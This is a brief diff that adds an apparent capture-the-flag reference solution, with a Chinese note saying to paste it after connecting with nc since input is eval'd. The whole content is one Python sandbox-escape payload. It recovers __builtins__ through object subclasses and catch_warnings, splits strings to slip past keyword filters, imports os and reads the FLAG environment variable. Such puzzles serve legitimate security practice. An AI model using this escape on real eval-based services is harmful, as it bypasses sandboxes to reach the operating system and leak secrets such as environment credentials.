@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr(getattr(getattr([x for x in getattr(getattr(getattr((), '__cl'+'ass__'), '__ba'+'se__'), '__sub'+'classes__')() if getattr(x, '__name__')=='catch_warnings'][0](), '_module'), '__builtins__')['__i'+'mport__']('o'+'s'), 'envi'+'ron')['F'+'LAG']
